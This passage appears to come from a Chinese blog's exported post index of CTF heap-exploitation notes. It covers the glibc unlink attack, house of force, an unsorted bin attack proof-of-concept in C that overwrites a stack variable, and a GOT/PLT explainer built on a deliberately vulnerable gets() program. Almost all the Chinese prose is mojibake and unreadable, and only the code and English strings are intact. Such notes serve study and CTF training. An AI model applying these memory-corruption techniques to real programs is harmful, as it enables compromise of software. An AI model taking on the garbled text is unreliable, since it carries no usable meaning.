<li>åŒå‘é“¾è¡¨ä¸­ç§»é™¤/æ·»åŠ ä¸€ä¸ªchunkæ—¶ï¼Œä¼šå‘ç”Ÿæ–­é“¾çš„æ“ä½œï¼Œè¿™ä¸ªæ–­é“¾çš„è¿‡ç¨‹å°±å«åšunlink</li>
<li>æ³¨æ„äº‹é¡¹ï¼šunlinkä¸å‘ç”Ÿåœ¨fastbinå’Œsmallbinä¸­ï¼Œæ‰€ä»¥fastbinå’Œsmallbinå®¹æ˜“äº§ç”Ÿæ¼æ´</li>
</ul>
<h3 id="2-å‘ç”Ÿåœºæ™¯"><a href="#2-å‘ç”Ÿåœºæ™¯" class="headerlink" title="2.å‘ç”Ÿåœºæ™¯"></a>2.å‘ç”Ÿåœºæ™¯</h3><p><strong>mallocæ—¶ï¼š</strong></p>
<ul>
<li>ä»æ°å¥½å¤§å°åˆé€‚çš„largebinä¸­è·å–chunkï¼Œå‘ç”Ÿunlink</li>
<li>ä»æ¯”mallocè¦æ±‚å¤§çš„largebinä¸­å–chunkï¼Œå‘ç”Ÿunlink</li>
</ul>
<p><strong>freeæ—¶ï¼š</strong></p>
<ul>
<li>freeä¹‹åï¼Œä¸å‰åç©ºé—²çš„chunkè¿›è¡Œåˆå¹¶</li>
</ul>
<p><strong>malloc consolidateæ—¶ï¼š</strong></p>
<ul>
<li>consolidateæ—¶ï¼Œchunkä¹‹é—´çš„unlink</li>
</ul>
<p><strong>reallocæ—¶ï¼š</strong></p>
<ul>
<li>å‘å‰æ‰©å±•ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—²chunk</li>
</ul>
<h3 id="3-å¤è€çš„unlink"><a href="#3-å¤è€çš„unlink" class="headerlink" title="3.å¤è€çš„unlink"></a>3.å¤è€çš„unlink</h3><p>å…¶ä¸­Pä¸ºéœ€è¦é‡Šæ”¾/æ·»åŠ çš„chunk</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png" alt="img"></p>
<p>unlinkçš„ä»£ç </p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png" alt="image-20200723164353967"></p>
<blockquote>
<p>(1)å°†å‰ä¸€ä¸ªchunkå ç”¨çš„å†…å­˜åˆå¹¶åˆ°å½“å‰chunk;</p>
<p>(2)ä¿®æ”¹æŒ‡å‘å½“å‰chunkçš„æŒ‡é’ˆï¼Œæ”¹ä¸ºæŒ‡å‘å‰ä¸€ä¸ªchunkã€‚</p>
<p>(3)ä½¿ç”¨unlinkå®ï¼Œå°†å‰ä¸€ä¸ªfree chunkä»åŒå‘å¾ªç¯é“¾è¡¨ä¸­ç§»é™¤</p>
</blockquote>
<p>æ­¤ä¾‹æ¥è‡ªctf-wiki</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png" alt="img"></p>
<p>ç°åœ¨æœ‰ç‰©ç†ç©ºé—´è¿ç»­çš„ä¸¤ä¸ª chunkï¼ˆQï¼ŒNextchunkï¼‰ï¼Œå…¶ä¸­ Q å¤„äºä½¿ç”¨çŠ¶æ€ã€Nextchunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆ<strong>æ¯”å¦‚æº¢å‡º</strong>ï¼‰å°† Nextchunk çš„ fd å’Œ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ã€‚åˆ™å½“æˆ‘ä»¬ free(Q) æ—¶</p>
<ul>
<li>glibc åˆ¤æ–­è¿™ä¸ªå—æ˜¯ small chunk</li>
<li>åˆ¤æ–­å‰å‘åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‰å‘åˆå¹¶</li>
<li>åˆ¤æ–­åå‘åˆå¹¶ï¼Œå‘ç°åä¸€ä¸ª chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œéœ€è¦åˆå¹¶</li>
<li>ç»§è€Œå¯¹ Nextchunk é‡‡å– unlink æ“ä½œ</li>
</ul>
<p>é‚£ä¹ˆ unlink å…·ä½“æ‰§è¡Œçš„æ•ˆæœæ˜¯ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ¥åˆ†æä¸€ä¸‹</p>
<p><strong>ä»¥ä¸‹12å’Œ8éƒ½æ˜¯å¯¹äº32ä½æ¥è¯´çš„</strong></p>
<ul>
<li>FD=P-&gt;fd = target addr -12</li>
<li>BK=P-&gt;bk = expect value</li>
<li>FD-&gt;bk = BKï¼Œå³ *(target addr-12+12)=BK=expect value</li>
<li>BK-&gt;fd = FDï¼Œå³ *(expect value +8) = FD = target addr-12</li>
</ul>
<p>è¿™å¼ å›¾ç‰‡åº”è¯¥æ›´å¥½ç†è§£</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png" alt="image-20200723165236574"></p>
<h3 id="4-æ–°çš„unlink"><a href="#4-æ–°çš„unlink" class="headerlink" title="4.æ–°çš„unlink"></a>4.æ–°çš„unlink</h3><p>æ–°ç‰ˆçš„unlinkåŠ å…¥äº†ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸æŒ‡å‘Pï¼Œé‚£ä¹ˆå°±å‡ºç°äº†é—®é¢˜</p>
<p>é‚£å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆæˆ‘ä»¬é€šè¿‡è¦†ç›–ï¼Œå°† nextchunk çš„ FD æŒ‡é’ˆæŒ‡å‘äº† fakeFDï¼Œå°† nextchunk çš„ BK æŒ‡é’ˆæŒ‡å‘äº† fakeBK ã€‚é‚£ä¹ˆä¸ºäº†é€šè¿‡éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>å½“æ»¡è¶³ä¸Šè¿°ä¸¤å¼æ—¶ï¼Œå¯ä»¥è¿›å…¥ Unlink çš„ç¯èŠ‚ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>å¦‚æœè®© fakeFD + 12 å’Œ fakeBK + 8 æŒ‡å‘åŒä¸€ä¸ªæŒ‡å‘ P çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>å³é€šè¿‡æ­¤æ–¹å¼ï¼ŒP çš„æŒ‡é’ˆæŒ‡å‘äº†æ¯”è‡ªå·±ä½ 12 çš„åœ°å€å¤„ã€‚æ­¤æ–¹æ³•è™½ç„¶ä¸å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹æŒ‡å‘ chunk çš„æŒ‡é’ˆï¼Œè¿™æ ·çš„ä¿®æ”¹æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœçš„ã€‚</p>
<h3 id="5-åˆ©ç”¨æ¡ä»¶"><a href="#5-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="5.åˆ©ç”¨æ¡ä»¶"></a>5.åˆ©ç”¨æ¡ä»¶</h3><ol>
<li>UAF ï¼Œå¯ä¿®æ”¹ free çŠ¶æ€ä¸‹ smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ</li>
<li>å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ chunk</li>
</ol>
<h3 id="6-æ•ˆæœ"><a href="#6-æ•ˆæœ" class="headerlink" title="6.æ•ˆæœ"></a>6.æ•ˆæœ</h3><p>ä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18</p>
<h2 id="0x06-house-of-force"><a href="#0x06-house-of-force" class="headerlink" title="0x06 house of force"></a>0x06 house of force</h2><h3 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1.åŸç†"></a>1.åŸç†</h3><p>æ”»å‡»è€…é€šè¿‡å †æº¢å‡ºæˆ–è€…å…¶ä»–æ–¹å¼ï¼Œæ§åˆ¶åˆ°topchunkçš„sizeæˆå‘˜ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿topchunkçš„åœ°å€è¶…å‡ºæ­£å¸¸çš„å †æ®µçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶åˆ°è¶…å‡ºå †æ®µä¹‹å¤–çš„å†…å­˜</p>
<h3 id="2-åˆ©ç”¨æ¡ä»¶-2"><a href="#2-åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="2.åˆ©ç”¨æ¡ä»¶"></a>2.åˆ©ç”¨æ¡ä»¶</h3><ul>
<li>â‘ é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ–¹å¼ï¼Œæ§åˆ¶åˆ°topchunkçš„sizeæˆå‘˜</li>
<li>â‘¡å°†topchunkçš„sizeæˆå‘˜å˜ä¸ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè¿™æ ·topchunkå°±ä¼šè¶…å‡ºå†…å­˜ä¸­çš„å †æ®µï¼Œä»è€Œè®¿é—®åˆ°å…¶ä»–æ®µçš„å†…å­˜åœ°å€ï¼ˆgotè¡¨çš„åœ°å€ï¼‰</li>
<li>â‘¢æ­¤æ—¶é€šè¿‡mallocç”³è¯·å†…å­˜çš„æ—¶å€™ï¼Œç”³è¯·çš„å°±æ˜¯gotçš„å†…å­˜åœ°å€ï¼Œå°±å¯ä»¥æ›´æ”¹gotå†…å­˜çš„å†…å®¹</li>
</ul>
<h2 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h2><h3 id="1-æ¦‚å¿µ-5"><a href="#1-æ¦‚å¿µ-5" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Unsorted Bin Attack è¢«åˆ©ç”¨çš„å‰ææ˜¯æ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆã€‚Unsorted Bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ã€‚</p>
<h3 id="2-ä½¿ç”¨æƒ…å†µ"><a href="#2-ä½¿ç”¨æƒ…å†µ" class="headerlink" title="2.ä½¿ç”¨æƒ…å†µ"></a>2.ä½¿ç”¨æƒ…å†µ</h3><ol>
<li>Unsorted Bin åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯ FIFOï¼Œ<strong>å³æ’å…¥çš„æ—¶å€™æ’å…¥åˆ° unsorted bin çš„å¤´éƒ¨ï¼Œå–å‡ºçš„æ—¶å€™ä»é“¾è¡¨å°¾è·å–</strong>ã€‚</li>
<li>åœ¨ç¨‹åº malloc æ—¶ï¼Œå¦‚æœåœ¨ fastbinï¼Œsmall bin ä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„ chunkï¼Œå°±ä¼šå°è¯•ä» Unsorted Bin ä¸­å¯»æ‰¾ chunkã€‚å¦‚æœå–å‡ºæ¥çš„ chunk å¤§å°åˆšå¥½æ»¡è¶³ï¼Œå°±ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šæŠŠè¿™äº› chunk åˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„ bin ä¸­ã€‚</li>
</ol>
<h3 id="3-åŸç†è§£é‡Š"><a href="#3-åŸç†è§£é‡Š" class="headerlink" title="3.åŸç†è§£é‡Š"></a>3.åŸç†è§£é‡Š</h3><ol>
<li><p>unsortedbinæ­£å¸¸å­˜å‚¨freechunkçš„ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼Œæ­¤æ—¶è¿™ä¸ªfreechunkæ˜¯æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡é’ˆæ“æ§çš„ï¼ˆè™½ç„¶freeäº†ä½†æ²¡æœ‰ç½®ç©ºï¼‰<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png" alt="image-20201222212418753"></p>
</li>
<li><p>å¦‚æœåœ¨å–èµ°å †å—ä¹‹å‰ï¼Œæˆ‘ä»¬å°†unsortedbinä¸­çš„chunkçš„bkæŒ‡é’ˆæ”¹ä¸ºæˆ‘ä»¬çš„targetåœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png" alt="image-20201222212555394"></p>
</li>
<li><p>æ­¤æ—¶æˆ‘ä»¬å»mallocå †å—çš„æ—¶å€™å°±ä¼šå‘ç”Ÿå¦‚ä¸‹ä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** victim is free chunk **/</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png" alt="image-20201222213058942"></p>
<p>åœ¨æˆ‘ä»¬ç§»é™¤victimä¹‹åå°±å˜æˆäº†è¿™æ ·ã€‚æˆ‘ä»¬çš„targetçš„fdçš„å†…å®¹ä¸ºmalloc_stateç»“æ„ä½“çš„unsortedbiné“¾çš„fdæŒ‡é’ˆäº†</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png" alt="image-20201222213335526"></p>
</li>
</ol>
<h3 id="4-æ¼”ç¤º"><a href="#4-æ¼”ç¤º" class="headerlink" title="4.æ¼”ç¤º"></a>4.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large "</span></span><br><span class="line">                  <span class="string">"unsigned long value into stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">"In practice, unsorted bin attack is generally prepared for further "</span></span><br><span class="line">      <span class="string">"attacks, such as rewriting the "</span></span><br><span class="line">      <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid "</span></span><br><span class="line">                  <span class="string">"consolidating the top chunk with"</span></span><br><span class="line">                  <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the "</span></span><br><span class="line">                  <span class="string">"unsorted bin with its bk pointer "</span></span><br><span class="line">                  <span class="string">"point to %p\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the "</span></span><br><span class="line">                  <span class="string">"victim-&gt;bk pointer\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits "</span></span><br><span class="line">                  <span class="string">"machine, it should be target address-8):%p\n\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During "</span></span><br><span class="line">                  <span class="string">"this time, target should has already been "</span></span><br><span class="line">                  <span class="string">"rewrite:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;target_var, (<span class="keyword">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png" alt="image-20201222164945226"></p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png" alt="img"></p>
<p>ç»è¿‡ä¸Šé¢åŸç†çš„è§£é‡Šï¼Œè¿™ä¸ªå°±ä¸è¯´äº†</p>
<p>æœ€åæ€»ç»“ä¸€å¥è¯:</p>
<p>ä¿®æ”¹ target å¤„çš„å€¼ä¸º unsorted bin çš„é“¾è¡¨å¤´éƒ¨ 0x7f1c705ffb78ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰è¾“å‡ºçš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ° unsorted bin attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>å †</tag>
      </tags>
  </entry>
  <entry>
    <title>pltè¡¨å’Œgotè¡¨</title>
    <url>/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/</url>
    <content><![CDATA[<p>éœ€è¦å•¥ å­¦å•¥</p>
<p>çœ‹å­¦é•¿åšå®¢å†™äº†è¿™ä¸ª è‡ªå·±ä¹Ÿè®°å½•ä¸€ä¸‹ æ¯•ç«Ÿåˆšå­¦</p>
<p><a href="https://ld1ng.com/2020/06/16/GOTPLT/" target="_blank" rel="noopener">https://ld1ng.com/2020/06/16/GOTPLT/</a></p>
<p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p>
<p><a href="https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p>
<h1 id="GOTè¡¨å’ŒPLTè¡¨"><a href="#GOTè¡¨å’ŒPLTè¡¨" class="headerlink" title="GOTè¡¨å’ŒPLTè¡¨"></a>GOTè¡¨å’ŒPLTè¡¨</h1><p>GOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰å’Œ PLT(è¿‡ç¨‹é“¾æ¥è¡¨)ï¼Œæ˜¯ä¸¤ä¸ªè¡¨ä¹‹é—´çš„äº¤äº’æ‰ä½¿å¾—å‡½æ•°å®ç°å»¶è¿Ÿç»‘å®šï¼Œé€šè¿‡è¿™ç§æ–¹æ³•å°†è¿‡ç¨‹åœ°å€çš„ç»‘å®šæ¨è¿Ÿåˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ã€‚</p>
<h1 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"you win\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">	gets(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"you lose\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘è¿™ä¸ªæ–‡ä»¶</p>
<p>gdbè°ƒè¯•ä¸€ä¸‹</p>
<p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png" alt="image-20201216221001253"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>gets@plt</code>å’Œ<code>puts@plt</code>è¿™ä¸¤ä¸ªå‡½æ•°</p>
<p>@pltè¿™é‡Œçš„æ„æ€æ˜¯æŒ‡PLTè¡¨ä¸­çš„æ•°æ®çš„åœ°å€ã€‚</p>
<blockquote>
<p>ä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒå’Œå†…å­˜CPUçš„åˆ©ç”¨ç‡ï¼Œç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸ºPLTè¡¨ï¼Œä¸€ä¸ªä¸ºGOTè¡¨ï¼ŒPLTè¡¨å¯ä»¥ç§°ä¸ºå†…éƒ¨å‡½æ•°è¡¨ï¼ŒGOTè¡¨ä¸ºå…¨å±€å‡½æ•°è¡¨ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯åŠ¨æ€å‡½æ•°è¡¨è¿™æ˜¯ä¸ªäººè‡ªç§°ï¼‰ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ç›¸å¯¹åº”çš„ï¼Œä»€ä¹ˆå«åšç›¸å¯¹åº”å‘¢ï¼ŒPLTè¡¨ä¸­çš„æ•°æ®å°±æ˜¯GOTè¡¨ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€å®šæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œ</p>
<p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p>
</blockquote>
<p>è¿™æ—¶ æˆ‘ä»¬ä¹Ÿå°±ç†è§£äº†@pltæ ‡å¿—çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯ä¸ªè¿‡æ¸¡ä½œç”¨ï¼Œå› ä¸ºGOTè¡¨é¡¹ä¸­çš„æ•°æ®æ‰æ˜¯å‡½æ•°æœ€ç»ˆçš„åœ°å€ï¼Œè€ŒPLTè¡¨ä¸­çš„æ•°æ®åˆæ˜¯GOTè¡¨é¡¹çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨æ¥å¾—åˆ°å‡½æ•°çœŸæ­£çš„åœ°å€ã€‚</p>
<p>é‚£@pltå‡½æ•°é‡Œé¢æ˜¯ä»€ä¹ˆå‘¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disass gets</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png" alt="image-20201216223010888"></p>
<blockquote>
<ol>
<li>jmpæŒ‡ä»¤è·³è½¬åˆ°GOTè¡¨</li>
<li>GOTè¡¨ä¸­çš„æ•°æ®ä¸º0x4004c6</li>
<li>è·³è½¬åˆ°æŒ‡ä»¤åœ°å€ä¸º0x4004c6</li>
<li>æ‰§è¡Œ<code>push 0x3</code>è¿™ä¸ªä¸ºåœ¨GOTä¸­çš„ä¸‹æ ‡åºå·</li>
<li>åœ¨æ‰§è¡Œ<code>jmp 0x400480</code></li>
<li>è€Œ0x400480ä¸ºPLT[0]çš„åœ°å€</li>
<li>PLT[0]çš„æŒ‡ä»¤ä¼šè¿›å…¥åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£</li>
<li>æ‰§è¡Œä¸€ä¸ªå‡½æ•°å°†çœŸæ­£çš„å‡½æ•°åœ°å€è¦†ç›–åˆ°GOTè¡¨ä¸­</li>
</ol>
</blockquote>
